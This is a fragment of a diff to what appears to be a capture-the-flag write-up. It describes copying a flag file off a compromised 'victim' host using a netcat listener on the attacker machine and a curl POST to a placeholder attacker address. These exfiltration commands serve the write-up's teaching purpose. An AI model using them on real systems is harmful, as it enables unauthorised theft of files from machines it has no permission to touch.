@@ -1078,7 +1078,7 @@ Cache-Control: max-age=0
 
 On the victim host an interesting file can be found: `unusual_flag.mp4`. It can be transferred like the following:
 * on the attacker machine: `nc -l -p 8000 > unusual_flag.mp4`;
-* on the victim machine: `curl -X POST --data-binary @unusual_flag.mp4 http://x.x.x.x:8000`
+* on the victim machine: `curl -X POST --data-binary @unusual_flag.mp4 http://x.x.x.x:8000`.
 
 At this point you have to remove the HTTP headers inserted into the created file by `nc` and then you can launch the MP4 video [unusual_flag.mp4](unusual_flag.mp4).
 
